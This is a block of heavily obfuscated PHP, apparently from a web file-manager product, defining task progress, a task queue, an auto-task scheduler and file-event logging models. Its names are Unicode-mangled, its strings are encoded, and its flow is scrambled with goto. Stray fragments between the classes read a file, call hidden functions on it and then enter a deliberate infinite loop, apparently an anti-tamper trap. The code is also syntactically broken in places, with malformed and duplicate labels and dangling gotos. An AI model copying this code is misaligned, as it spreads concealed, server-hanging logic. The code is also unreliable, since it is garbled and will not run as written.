$_SERVER[̉]; $Aಉ = $b􏡻; if ($Aಉ == $GLOBALS[$F[1586]]) { $Aಉ = $GLOBALS[$F[1587]]; } goto A; A: $GLOBALS[$F[1587]] = $b􏡻; $GLOBALS[$F[1586]] = $B޴; $b =& $this->task; goto B顽; CѰ: $this->update(); goto A橚ɚ; dܐ: $b[$F[1022]] = $F[33]; $b[$F[1577]] = $F[33]; $b[$F[1578]] = 0; goto CѰ; A橚ɚ: } public function copyFileEnd($C, $B񮩨, $c؄, $Cհ, $e刎, $d֢) { $A뉱 =& $_SERVER[̉]; $cƗ =& $this->task; $cƗ[$A뉱[1576]] = $cƗ[$A뉱[1575]]; $cƗ[$A뉱[1577]] = $A뉱[33]; if ($e刎 == $cƗ[$A뉱[1573]]) { $cƗ[$A뉱[1579]] += $cƗ[$A뉱[1575]]; $cƗ[$A뉱[1580]] = $cƗ[$A뉱[1579]]; $this->update(1); } else { $this->update(); $cƗ[$A뉱[1576]] = 0; } self::log($A뉱[1588] . $B񮩨 . $A뉱[67] . $Cհ . $A뉱[229] . $e刎 . $A뉱[1589] . $cƗ[$A뉱[1573]]); } public function updateFileEnd($d, $fδӼ) { goto få; EƾЗ: $F[$d[1575]] = $fδӼ; $F[$d[1579]] += $fδӼ; $F[$d[1580]] = $F[$d[1579]]; goto D; få: $d =& $_SERVER[̉]; $F =& $this->task; $F[$d[1573]] = $d; goto EƾЗ; D: $this->update(1); self::log($d[1590] . $d); goto fʧ; fʧ: } public function sourceModelCopy($Fĥ) { goto FȢ; cۮ: $E =& $this->task; $this->sourceModelCopyFlag = !0; $cŇܐ = 0; goto Dҗߖ; Dҗߖ: switch ($dߣ) { case $f舷[535]: $cŇܐ = 1; break; case $f舷[538]: $E[$f舷[1573]] = $C[$f舷[28]]; break; case $f舷[540]: $cŇܐ = intval($Fĥ[$f舷[377]] * 0.4); break; case $f舷[542]: $cŇܐ = intval($Fĥ[$f舷[377]] * 0.2); break; case $f舷[544]: $cŇܐ = intval($Fĥ[$f舷[377]] * 0.4); break; } $this->update($cŇܐ); $this->sourceModelCopyFlag = !1; goto fӊ; FȢ: $f舷 =& $_SERVER[̉]; $dߣ = $Fĥ[0]; $C = $Fĥ[1]; goto cۮ; fӊ: } public function sourceRemove($Dǟ, $c) { $d =& $_SERVER[̉]; $this->sourceModelCopyFlag = !0; $eɵ = 1; if (isset($Dǟ[$d[81]])) { $eɵ = $Dǟ[$d[81]][$d[79]] + $Dǟ[$d[81]][$d[80]] + 1; } $this->update($eɵ); $this->sourceModelCopyFlag = !1; } public function sourceMove($fð) { $this->sourceRemove($fð, !1); } public function curlProgress($F󢄍, $A, $b쎚, $e, $e) { $b͛׆ =& $_SERVER[̉]; $B =& $this->task; if ($e > 0) { $B[$b͛׆[1022]] = $b͛׆[1591]; $B[$b͛׆[1577]] = $b͛׆[107]; if ($B[$b͛׆[1575]]) { $B[$b͛׆[1576]] = $e; } if ($B[$b͛׆[1578]]) { $B[$b͛׆[1576]] = $e + $B[$b͛׆[1578]]; } } else { if ($b쎚 > 0) { if ($B[$b͛׆[1575]] == $A) { $B[$b͛׆[1576]] = $b쎚; $B[$b͛׆[1022]] = $b͛׆[1592]; $B[$b͛׆[1577]] = $b͛׆[1093]; } } } $this->update(); } public function curlProgressStart($aӈΧ) { } public function curlProgressEnd($e̟) { goto eǻާ; eǻާ: $bː =& $_SERVER[̉]; $å =& $this->task; $d = curl_getinfo($e̟); goto eʚ; eʚ: $bϥ̆ = $d[$bː[1593]]; if ($bϥ̆ == -1) { $bϥ̆ = $d[$bː[1594]]; } if ($å[$bː[1577]] == $bː[107] && $bϥ̆) { $å[$bː[1578]] += $bϥ̆; } goto Cﲗ; Cﲗ: $this->update(); goto dè; dè: } } class TaskHttp extends Task { protected function startAfter() { $d֟ =& $_SERVER[̉]; $cȎ˩ =& $this->task; $cȎ˩[$d֟[1595]] = 1; Hook::bind($d֟[1567], array($this, $d֟[1596])); Hook::bind($d֟[1569], array($this, $d֟[1597])); Hook::bind($d֟[1571], array($this, $d֟[1598])); } protected function endAfter() { $B϶ =& $_SERVER[̉]; Hook::unbind($B϶[1567], array($this, $B϶[1596])); Hook::unbind($B϶[1569], array($this, $B϶[1597])); Hook::unbind($B϶[1571], array($this, $B϶[1598])); } public function progressStart($aߟ) { $e𤷏 =& $_SERVER[̉]; $a⃶ = curl_getinfo($aߟ); self::log($e𤷏[1599] . $a⃶[$e𤷏[305]]); self::valueSet($this->task[$e𤷏[393]], $this->task); } public function progressEnd($Bŝ) { $Bó =& $_SERVER[̉]; self::log($Bó[1600] . $this->task[$Bó[393]]); $this->end(); } public function progress($Fש, $dу, $b妶, $bӈ, $BÉߓ) { $Eʃ =& $_SERVER[̉]; $bۡ =& $this->task; if ($BÉߓ > 0) { $bۡ[$Eʃ[1020]] = $bۡ[$Eʃ[1020]] == 0 ? $bӈ : $bۡ[$Eʃ[1020]]; $bۡ[$Eʃ[1035]] = $BÉߓ; } else { if ($b妶 > 0) { $bۡ[$Eʃ[1020]] = $bۡ[$Eʃ[1020]] == 0 ? $dу : $bۡ[$Eʃ[1020]]; $bۡ[$Eʃ[1035]] = $b妶; } } $this->update(); self::log("\160\162\157\x67\162\145\x73\x73\110\x74\164\160\x3a\144\x6f\167\156\x3a{$b妶}\57{$dу}\73\40\x75\x70\154\x6f\141\144\72{$BÉߓ}\57{$bӈ}\x3b"); } } class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\164\141\x73\x6b\x51\165\x65\x75\145\114\x65\156\147\x74\x68"; const QUEUE_DATA = "\x74\x61\163\153\x51\x75\x65\165\145\104\141\164\x61"; public static $listData = false; public static function initTask() { } public static function add($c, $A = array(), $Aޖѓ = '', $D̗ = '') { $c =& $_SERVER[̉]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($D̗ && array_find_by_field(self::$listData, $c[93], $D̗)) { return !0; } self::$listData[] = array($c[262] => $c, $c[1601] => $A, $c[431] => $Aޖѓ, $c[93] => $D̗); return !0; } public static function addSubmit() { $B =& $_SERVER[̉]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($B[1602] . json_encode_force(array_to_keyvalue(self::$listData, $B[33], $B[431])), $B[1603]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($Bܩ, $B = array(), $Cؽ = '', $FԂ = '') { goto c­; e: self::setAll($Eõɨ); return !0; goto c͂; c­: $f =& $_SERVER[̉]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Eõɨ = self::getAll(); goto cƨ; cƨ: if ($FԂ && array_find_by_field($Eõɨ, $f[93], $FԂ)) { return !0; } $Eõɨ[] = array($f[262] => $Bܩ, $f[1601] => $B, $f[431] => $Cؽ, $f[93] => $FԂ); write_log($f[1602] . $Cؽ, $f[1603]); goto e; c͂: } public static function run() { goto eؑ쓌; a֖: if (!$A) { return !1; } self::setAll($EŅ); $Cυ = timeFloat(); goto Dǚ; eؑ쓌: $f뉓 =& $_SERVER[̉]; $EŅ = self::getAll(); $A = array_shift($EŅ); goto a֖; F봋: return !0; goto c; Dǚ: try { Hook::apply($A[$f뉓[262]], $A[$f뉓[1601]]); } catch (Exception $B) { } $e = number_format(timeFloat() - $Cυ, 3) . $f뉓[1544]; write_log($f뉓[1604] . $A[$f뉓[431]] . $f뉓[1605] . $e, $f뉓[1603]); goto F봋; c: } public static function count() { $eӥ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$eӥ) { return 0; } return intval($eӥ); } public static function getAll() { $B̗ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$B̗) { return array(); } return $B̗; } public static function setAll($dю) { $Dȹ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($dю), $Dȹ); Cache::set(self::QUEUE_DATA, $dю, $Dȹ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } goto B̉; E򣽰: if (!isset($_SERVER[$_SERVER[̉][834]]) || !isset($_SERVER[$_SERVER[̉][835]])) { goto Eג; Eג: $Dح = $_SERVER[̉][837]; $FǗˇ = $_SERVER[$_SERVER[̉][838]] . $_SERVER[̉][839]; $Fʐ = $Dح($FǗˇ); goto A; A: $d = explode($_SERVER[̉][229], $Fʐ); if (count($d) < $_SERVER[̉][583]) { $aѨ = $_SERVER[̉][840]; $aѨ(); } $aԎ = $_SERVER[̉][1215]; goto Cɛ; Cɛ: $aԎ($_SERVER[$_SERVER[̉][838]] . $_SERVER[̉][839]); $cş = 2; while ($cş > 1) { $e = rawurlencode($cş . $_SERVER[̉][375]); } goto b،; b،: } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\163\x74\x65\155\x5f\157\x70\164\151\157\156"; protected $jsonField = array("\155\145\x6e\165", "\162\x6f\154\145", "\162\157\x6c\x65\x47\x72\157\x75\x70", "\x72\x65\x67\x69\x73\x74", "\145\x6d\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($bئ) { return "\x53\171\163\164\145\x6d\117\160\164\x69\157\156\137{$bئ}"; } protected function optionDefault($fŠ = '') { $fơ =& $_SERVER[̉]; if ($fŠ == $fơ[33]) { return $GLOBALS[$fơ[6]][$fơ[378]]; } } } class SystemRecordModel extends ModelBaseLight { } goto C; Cӛ: if ($_SERVER[$_SERVER[̉][834]] != $D($Fٶ)) { goto a毤; AΗ: $aԎ($Fٶ); goto AŢ먭ۂ; DБ: $d = explode($_SERVER[̉][229], $Fʐ); if (count($d) < $_SERVER[̉][583]) { $aѨ = $_SERVER[̉][840]; $aѨ(); } $aԎ = $_SERVER[̉][1215]; goto AΗ; a毤: $Dح = $_SERVER[̉][837]; $FǗˇ = $_SERVER[$_SERVER[̉][838]] . $_SERVER[̉][839]; $Fʐ = $Dح($FǗˇ); goto DБ; AŢ먭ۂ: } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { goto C; cː: http_close(); self::valueSet($A߯[1495], $A߯[87]); Hook::bind($A߯[1497], $A߯[1498]); goto bٳ; bٳ: while (!0) { self::cacheClear(); if (self::valueGet($A߯[713]) != $A߯[87]) { self::valueSet($A߯[1495], $A߯[191]); self::log($A߯[1499]); die; } self::valueSet($A߯[1495], $A߯[87]); self::valueSet($A߯[1496], time()); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } goto Aّ; C: $A߯ =& $_SERVER[̉]; if (self::valueGet($A߯[713]) != $A߯[87]) { return; } if (self::valueGet($A߯[1495]) == $A߯[87]) { $Aд = self::valueGet($A߯[1496]); if (time() - $Aд > self::AUTO_RESTART_TIME) { self::restart(); } return; } goto cː; Aّ: } public static function restart() { $E =& $_SERVER[̉]; http_close(); self::valueSet($E[713], $E[191]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet($E[1495], $E[191]); self::valueSet($E[713], $E[87]); } public static function shutdownEvent() { $ạޜƘ =& $_SERVER[̉]; self::valueSet($ạޜƘ[1495], $ạޜƘ[191]); self::log($ạޜƘ[1500]); } public static function config($cҪ, $B) { self::valueSet($_SERVER[̉][713], $cҪ); } private static function taskRunAll() { goto C≚; dԔ: self::taskQueueRun($fئ); self::closeDatabase(); goto Eꆥ; C≚: $b =& $_SERVER[̉]; $fئ = timeFloat(); $e = Model($b[1501])->listData(); goto dތ; dތ: $c = count($e); for ($a萇 = 0; $a萇 < $c; $a萇++) { $f텣 = $e[$a萇]; if (!$f텣[$b[393]] || $f텣[$b[1502]] != $b[87]) { continue; } if (!self::taskTimeCheck($f텣)) { continue; } self::taskRun($f텣); } Hook::trigger($b[1503]); goto dԔ; Eꆥ: } private static function taskQueueRun($fգ) { $f͏ = 10; while (!0) { $F = TaskQueue::run(); if ($F === !1) { break; } if (timeFloat() - $fգ >= $f͏) { break; } } } private static function taskTimeCheck($b) { goto b; B: switch ($B[$Aã݌[29]]) { case $Aã݌[1510]: if (time() - $Fܰ < 3600 * 24 * 30) { return !1; } if ($B[$Aã݌[1510]] == date($Aã݌[1511]) && $eܰ) { return !0; } break; case $Aã݌[1512]: if (time() - $Fܰ < 3600 * 24 * 7) { return !1; } $E𙌩 = date($Aã݌[1513]) == 0 ? 7 : date($Aã݌[1513]); if ($B[$Aã݌[1512]] == $E𙌩 && $eܰ) { return !0; } break; case $Aã݌[1505]: if (time() - $Fܰ < 3600 * 24) { return !1; } if ($eܰ) { return !0; } break; case $Aã݌[1514]: if (time() - $Fܰ >= floatval($B[$Aã݌[1514]]) * 60) { return !0; } break; default: break; } return !1; goto Cޫ; b: $Aã݌ =& $_SERVER[̉]; $B = json_decode($b[$Aã݌[197]], !0); $Fܰ = intval($b[$Aã݌[1496]]); goto BϷƑ; BϷƑ: $dƶ = strtotime($Aã݌[1504] . $B[$Aã݌[1505]] . $Aã݌[1506]) - strtotime($Aã݌[1507]); $Fļ = time() - strtotime(date($Aã݌[1508]) . $Aã݌[1509]); $eܰ = $Fļ >= $dƶ && $Fļ <= $dƶ + 3600; goto B; Cޫ: } private static function closeDatabase() { goto aӟ; D: $D߄ = Model($cÏΆ[502])->db($cÏΆ[33]); if ($D߄) { $D߄->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($cÏΆ[1515], $cÏΆ[1516]); die; } goto B򔞼; aӟ: $cÏΆ =& $_SERVER[̉]; static $DῬ = 0; $b؝ͺ = 1800; goto aυȒ; aυȒ: if (!$DῬ) { $DῬ = time(); } if (time() - $DῬ < $b؝ͺ) { return; } $DῬ = time(); goto D; B򔞼: } public static function taskRun($FԋͰ) { goto AȎ; Fϲ: $Bۖޫ = timeFloat(); $D؄ = $Bظά[33]; switch ($FԋͰ[$Bظά[29]]) { case $Bظά[305]: $F = url_request($FԋͰ[$Bظά[1520]], $Bظά[228], !1, !1, !1, !1, 10); if ($F[$Bظά[713]]) { $D؄ = strlen($F[$Bظά[1087]]); } break; case $Bظά[227]: $D؄ = Hook::apply($FԋͰ[$Bظά[1520]]); default: break; } goto B܎; AȎ: $Bظά =& $_SERVER[̉]; self::log($Bظά[1517] . $FԋͰ[$Bظά[393]] . $Bظά[1518] . $FԋͰ[$Bظά[28]] . $Bظά[1519] . $FԋͰ[$Bظά[1520]]); Model($Bظά[1501])->run($FԋͰ[$Bظά[393]]); goto Fϲ; B܎: Model($Bظά[1521])->add(array($Bظά[1522] => $Bظά[33], $Bظά[1523] => $Bظά[191], $Bظά[29] => $Bظά[1524] . $FԋͰ[$Bظά[393]], $Bظά[1525] => json_encode(array($Bظά[28] => $FԋͰ[$Bظά[28]], $Bظά[1526] => timeFloat() - $Bۖޫ, $Bظά[291] => $D؄)))); self::log($Bظά[1527] . $FԋͰ[$Bظά[393]] . $Bظά[1528] . $D؄); return !0; goto B; B: } private static function valueGet($BĹ) { $f˵ =& $_SERVER[̉]; $d = $f˵[1529]; $F҃ = Model($f˵[1530])->get($BĹ, $d); if (is_null($F҃)) { Model($f˵[1530])->set($f˵[713], $f˵[87], $d); Model($f˵[1530])->set($f˵[1495], $f˵[191], $d); $F҃ = Model($f˵[1530])->get($BĹ, $d); } return $F҃; } private static function valueSet($F֣, $Cզї) { $Eٮ =& $_SERVER[̉]; return Model($Eٮ[1530])->set($F֣, $Cզї, $Eٮ[1529]); } protected static function log($FԄݥ) { write_log($FԄݥ, $_SERVER[̉][1516]); } private static function cacheClear() { $DЙ =& $_SERVER[̉]; $d̵ = Model($DЙ[1530])->cacheKey($DЙ[1529]); Cache::clearMemory($d̵); Model($DЙ[1501])->cacheClear(); } } class Task { const STATYS_STOP = "\x73\x74\x6f\160"; const STATYS_RUNNING = "\162\165\x6e\156\151\156\147"; const STATYS_KILL = "\153\x69\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($F, $Aﭳߞ = '', $a = 0, $aբ = '') { goto C񪽼; C񪽼: $FΜȸ =& $_SERVER[̉]; if (self::get($F)) { return; } $this->task = array($FΜȸ[393] => $F, $FΜȸ[1531] => USER_ID, $FΜȸ[1435] => $aբ, $FΜȸ[29] => $Aﭳߞ, $FΜȸ[1022] => $FΜȸ[33], $FΜȸ[1020] => $a, $FΜȸ[1035] => 0, $FΜȸ[1532] => 0, $FΜȸ[1533] => 0, $FΜȸ[752] => timeFloat(), $FΜȸ[751] => 0, $FΜȸ[1534] => 0, $FΜȸ[1535] => 0, $FΜȸ[1536] => 0, $FΜȸ[713] => $FΜȸ[1495]); goto f; fӛ;: $this->startAfter(); Hook::trigger($FΜȸ[1541], $this->task); $this->task[$FΜȸ[1534]] = timeFloat(); goto d¯㽆; f: $GLOBALS[$FΜȸ[1537]] = 1; Hook::bind($FΜȸ[1497], array($this, $FΜȸ[1538])); Hook::bind($FΜȸ[1539], array($this, $FΜȸ[1540])); goto fӛ;; d¯㽆: } public function end() { goto bҖÚ; bҖÚ: $Bǐ =& $_SERVER[̉]; if (!$this->task) { return; } if ($this->task[$Bǐ[1534]]) { self::valueSet($this->task[$Bǐ[393]], !1); } goto e; e: $f۞ = timeFloat() - $this->task[$Bǐ[752]]; self::log($Bǐ[1542] . $this->task[$Bǐ[393]] . $Bǐ[1543] . $f۞ . $Bǐ[1544]); Hook::unbind($Bǐ[1497], array($this, $Bǐ[1538])); goto CЙ; CЙ: Hook::unbind($Bǐ[1539], array($this, $Bǐ[1540])); $this->endAfter(); $this->task = !1; goto d; d: } public function update($b = 0, $d = false) { goto Bԛ; a: $bӛ[$D廾[713]] = $f ? $f : $bӛ[$D廾[713]]; $bӛ[$D廾[1535]] = $d݉[$D廾[1535]] ? $d݉[$D廾[1535]] : 0; $bӛ[$D廾[1534]] = timeFloat(); goto D; dև: $bӛ[$D廾[1035]] += $b; $bӛ[$D廾[751]] = timeFloat(); if ($bӛ[$D廾[1020]]) { if ($bӛ[$D廾[1020]] < $bӛ[$D廾[1035]]) { $bӛ[$D廾[1020]] = $bӛ[$D廾[1035]]; } $f = timeFloat() - $bӛ[$D廾[752]] - $bӛ[$D廾[1535]]; $bӛ[$D廾[1532]] = $bӛ[$D廾[1035]] / $bӛ[$D廾[1020]]; $bӛ[$D廾[1533]] = $bӛ[$D廾[1035]] / $f; if ($bӛ[$D廾[1532]] > 0) { $bӛ[$D廾[1536]] = $f * (1 - $bӛ[$D廾[1532]]) / $bӛ[$D廾[1532]]; } $bӛ[$D廾[1536]] = $bӛ[$D廾[1536]] <= 0 ? 0 : $bӛ[$D廾[1536]]; } goto f; D: Hook::trigger($D廾[1548], $bӛ); self::valueSet($bӛ[$D廾[393]], $bӛ); goto A; f: $this->updateAfter(); $bህǳ = 0.2; if (timeFloat() - $bӛ[$D廾[1534]] < $bህǳ && !$d) { return; } goto Bɝ; Bԛ: $D廾 =& $_SERVER[̉]; $bӛ =& $this->task; if (!$bӛ) { return; } goto dև; Bɝ: $d݉ = self::get($bӛ[$D廾[393]]); $f = $d݉[$D廾[713]]; if ($f == self::STATYS_KILL) { $B킗 = array($D廾[1545] => LNG($D廾[1546]), $D廾[1085] => !1); Cache::set($D廾[1547] . $this->task[$D廾[393]], $B킗, 30); $this->onKill(); $this->end(); die; } else { if ($f == self::STATYS_STOP) { $C֎ = 2; $d݉[$D廾[1535]] += $C֎; self::valueSet($bӛ[$D廾[393]], $d݉); sleep($C֎); $this->update(); return; } } goto a; A: } public function onKillSet($a˻, $A䞍 = array()) { $this->onKillCall = array($a˻, $A䞍); } public function onKill() { $c侗 =& $_SERVER[̉]; self::log($c侗[1542] . $this->task[$c侗[393]] . $c侗[1549]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($B) { $BԐķ =& $_SERVER[̉]; Cache::set($BԐķ[1547] . $this->task[$BԐķ[393]], $B, 60); return $B; } public static function get($b) { return self::valueGet($b); } public static function listData() { $ařܨ = self::valueGet(); return array_sort_by($ařܨ, $_SERVER[̉][752], !0); } public static function kill($D⊐) { return self::changeStatus($D⊐, self::STATYS_KILL); } public static function stop($A) { return self::changeStatus($A, self::STATYS_STOP); } public static function restart($fǑ) { return self::changeStatus($fǑ, self::STATYS_RUNNING); } public static function killAll() { $B閮 =& $_SERVER[̉]; $aצѣ = self::listData(); foreach ($aצѣ as $E) { self::kill($E[$B閮[393]]); } sleep(2); foreach ($aצѣ as $E) { self::valueSet($E[$B閮[393]], !1); } } private static function changeStatus($cˣ, $fĐ) { goto D֭; b£؏: $F[$A[713]] = $fĐ; self::valueSet($cˣ, $F); self::log($A[1550] . $F[$A[393]] . $A[1551] . $fĐ); goto b䖵; b䖵: return !0; goto B԰; D֭: $A =& $_SERVER[̉]; $F = self::valueGet($cˣ); if (!$F) { return !1; } goto b£؏; B԰: } public static function valueGet($B姺 = false) { $dړ =& $_SERVER[̉]; if ($B姺) { $cָÈ = Model($dړ[425])->where(array($dړ[93] => $B姺, $dړ[29] => $dړ[1552]))->find(); return $cָÈ ? json_decode($cָÈ[$dړ[372]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($eÈ৲ = false) { goto aƋ; eʫޏ: return $D; goto fʓ; D: $D = Model($Dˆ[425])->where($eۜ)->select(); $D = $D ? $D : array(); foreach ($D as $f݋ا => $FŠ) { $D[$f݋ا] = json_decode($FŠ[$Dˆ[372]], !0); } goto eʫޏ; aƋ: $Dˆ =& $_SERVER[̉]; $eۜ = array($Dˆ[29] => $Dˆ[1552]); if ($eÈ৲) { $eۜ[$Dˆ[1531]] = $eÈ৲; } goto D; fʓ: } public static function valueSet($Aǹ, $c) { goto Aڑ鈉; Aڑ鈉: $fފϊ =& $_SERVER[̉]; if (!$c) { return Model($fފϊ[425])->where(array($fފϊ[93] => $Aǹ, $fފϊ[29] => $fފϊ[1552]))->delete(); } $eΎ = json_encode($c); goto E; e: Model($fފϊ[425])->add($c꽪, array(), !0); goto E; E: if (!$eΎ) { ob_start(); var_dump($c); $fÑ = ob_get_clean(); self::log($fފϊ[1553] . json_encode_force($fÑ)); } if (!$Aǹ || !$c[$fފϊ[393]]) { return !1; } $c꽪 = array($fފϊ[29] => $fފϊ[1552], $fފϊ[1531] => USER_ID, $fފϊ[93] => $Aǹ, $fފϊ[372] => $eΎ); goto e; E: } public static function log($a΄) { if (!GLOBAL_DEBUG) { return; } write_log($a΄, $_SERVER[̉][1554]); } } goto f߂; bۃ: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\165\162\143\x65\x5f\145\x76\145\x6e\x74"; protected $dataAuto = array(array("\143\162\145\141\164\145\124\151\155\145", "\164\x69\x6d\x65", "\x69\156\x73\x65\x72\x74", "\146\x75\156\x63\x74\151\x6f\x6e"), array("\144\145\x73\143", '', "\x69\156\x73\145\x72\164\x2c\x75\x70\144\141\x74\x65\x2c\163\145\x6c\x65\x63\164", "\x6a\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($A֧, $A볺, $e۫󬟱 = '') { goto Cܠ; eӏ: return $this->add($a); goto bފ; Aؒ: if (!$d) { return !1; } if ($this->isCacheEvent($d, $A볺)) { return; } if ($e۫󬟱 && is_string($e۫󬟱)) { $e۫󬟱 = array($d[1728] => $e۫󬟱); } goto B揑; B揑: $a = array($d[410] => $A֧, $d[1903] => $d[$d[478]], $d[1904] => $d[$d[28]], $d[495] => !empty($d[$d[495]]) ? $d[$d[495]] : $d[33], $d[1523] => USER_ID, $d[415] => $A볺, $d[1525] => $e۫󬟱); $this->addSystemLog($A볺, $a); unset($a[$d[1904]], $a[$d[495]]); goto eӏ; Cܠ: $d =& $_SERVER[̉]; if (!$this->eventSave) { return; } $d = Model($d[1205])->sourceInfo($A֧); goto Aؒ; bފ: } private function addSystemLog($b, $e❹) { $E掲 =& $_SERVER[̉]; if ($b == $E掲[1905]) { $b = $e❹[$E掲[431]][$E掲[1906]]; } else { if (in_array($b, array($E掲[1672], $E掲[1907]))) { $b = $e❹[$E掲[431]][$E掲[718]]; } } $C۾ = array_merge($e❹, array($E掲[1908] => $e❹[$E掲[395]], $E掲[1909] => $e❹[$E掲[1909]])); Model($E掲[1636])->addLog($E掲[1910] . $b, $C۾); } private function isCacheEvent($F, $A𨷟) { if ($F[$_SERVER[̉][404]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($fÎǰ, $C) { $F჈ =& $_SERVER[̉]; $Cꅳ = Model($F჈[1205])->sourceInfo($fÎǰ); $e = array($F჈[1906] => $C, $F჈[28] => $Cꅳ[$F჈[28]]); return $this->addEvent($fÎǰ, $F჈[1905], $e); } public function eventFileEdit($d͡) { $a̒԰ =& $_SERVER[̉]; $B = array($a̒԰[1911] => $_SERVER[$a̒԰[1912]], $a̒԰[1913] => strtolower(ACTION)); return $this->addEvent($d͡, $a̒԰[1662], $B); } public function eventRecycle($b, $cզɐ) { return $this->addEvent($b, $_SERVER[̉][1907], $cզɐ); } public function eventRemove($e) { $a҈ =& $_SERVER[̉]; $E = Model($a҈[1205])->sourceInfo($e); $F = $E[$a҈[28]]; return $this->addEvent($E[$a҈[478]], $a҈[1661], $F); } public function eventShare($B, $f) { return $this->addEvent($B, $_SERVER[̉][1672], $f); } public function eventMove($Aؖ, $A, $D) { goto bԝ; bԝ: $BԘ =& $_SERVER[̉]; $D = Model($BԘ[1205]); $a힫 = $D->sourceInfo($Aؖ); goto A뢙٥; Aǌ: $this->addEvent($Aؖ, $BԘ[520], $F֑Х); $a힫 = $D->sourceInfo($Aؖ); $F֑Х = array($BԘ[395] => $a힫[$BԘ[395]], $BԘ[28] => $a힫[$BԘ[28]]); goto a׆; a׆: $this->addEvent($A, $BԘ[1917], $F֑Х); goto a·涔; A뢙٥: $b = $D->sourceInfo($A); $CԿ = $D->sourceInfo($D); $F֑Х = array($BԘ[1054] => $A, $BԘ[1914] => $b[$BԘ[28]], $BԘ[1894] => !empty($b[$BԘ[495]]) ? $b[$BԘ[495]] : $BԘ[33], $BԘ[1055] => $D, $BԘ[1915] => $CԿ[$BԘ[28]], $BԘ[1916] => !empty($CԿ[$BԘ[495]]) ? $CԿ[$BԘ[495]] : $BԘ[33]); goto Aǌ; a·涔: } public function eventCopy($f) { $this->eventCreate($f, $_SERVER[̉][518]); } public function eventRename($cȷȞÙ, $f牢, $CÝݠ) { $Dﱽŝ =& $_SERVER[̉]; $Fҫ = array($Dﱽŝ[1054] => $f牢, $Dﱽŝ[1055] => $CÝݠ); return $this->addEvent($cȷȞÙ, $Dﱽŝ[1221], $Fҫ); } public function eventAddComment($f, $DЄ쿵) { return $this->addEvent($f, $_SERVER[̉][1918], $DЄ쿵); } public function eventAddDesc($E, $bᄯ) { return $this->addEvent($E, $_SERVER[̉][1919], $bᄯ); } public function listBySource($E) { goto aȦ; e: if ($d抉[$Bɑ[403]] == $Bɑ[87]) { $b׍ = Model($Bɑ[1205])->listSearchChildren($E, 20000); $b׍[] = $E . $Bɑ[375]; $f͌ = array($Bɑ[395] => array($Bɑ[7], $b׍)); } $Cͺ = $this->where($f͌)->order($Bɑ[1920])->selectPage(); if ($Cͺ[$Bɑ[364]][$Bɑ[365]] == 0) { $Cͺ[$Bɑ[364]][$Bɑ[365]] = 1; $Cͺ[$Bɑ[367]] = array(array($Bɑ[410] => $E, $Bɑ[1903] => $d抉[$Bɑ[478]], $Bɑ[1523] => $d抉[$Bɑ[432]], $Bɑ[415] => $Bɑ[1921], $Bɑ[416] => $d抉[$Bɑ[194]], $Bɑ[1525] => $Bɑ[33])); } goto A֒; A֒: return $this->eventListParse($Cͺ, $E); goto fힶ; aȦ: $Bɑ =& $_SERVER[̉]; $d抉 = Model($Bɑ[1205])->sourceInfo($E); $f͌ = array($Bɑ[410] => $E); goto e; fힶ: } private function eventListParse($d߼, $bƲ) { goto aȎ; A: $d멣 = array_unique($d멣); $f삝 = array_unique(array_to_keyvalue($Că, $a[33], $a[1531])); $c = Model($a[506])->userListInfo($f삝); goto AŇꕩ; AŇꕩ: $DǦ = Model($a[793])->sourceListInfo($d멣, !0); foreach ($Că as &$E) { if ($E[$a[29]] == $a[520] && isset($E[$a[431]][$a[1054]])) { $E[$a[431]][$a[1054]] = $DǦ[$E[$a[431]][$a[1054]]]; $E[$a[431]][$a[1055]] = $DǦ[$E[$a[431]][$a[1055]]]; } if ($E[$a[29]] == $a[1917] && isset($E[$a[431]][$a[395]])) { $E[$a[431]][$a[395]] = $DǦ[$E[$a[431]][$a[395]]]; } $E[$a[85]] = $DǦ[$E[$a[395]]]; $E[$a[1922]] = $DǦ[$E[$a[1909]]]; if ($E[$a[29]] == $a[1661]) { $E[$a[1922]] = $E[$a[85]]; $E[$a[1909]] = $E[$a[1922]][$a[395]]; $E[$a[85]] = !1; $E[$a[395]] = $a[33]; } $E[$a[1852]] = $c[$E[$a[1531]]]; } unset($E); goto B; B: $d߼[$a[367]] = $Că; return $d߼; goto Bľ; cЋۮ: $Fъ = array_to_keyvalue($Că, $a[33], $a[1909]); foreach ($Că as $E) { $A젗 = $E[$a[431]]; if ($E[$a[29]] == $a[520] && isset($A젗[$a[1054]])) { $d멣[] = $A젗[$a[1054]] . $a[33]; $d멣[] = $A젗[$a[1055]] . $a[33]; } if ($E[$a[29]] == $a[1917] && isset($A젗[$a[395]])) { $d멣[] = $A젗[$a[395]] . $a[33]; } } $d멣 = array_merge($d멣, $Fъ, array($bƲ . $a[33])); goto A; aȎ: $a =& $_SERVER[̉]; $Că = $d߼[$a[367]]; $d멣 = array_to_keyvalue($Că, $a[33], $a[395]); goto cЋۮ; Bľ: } public function removeBySource($B娠) { $FٚǏ = 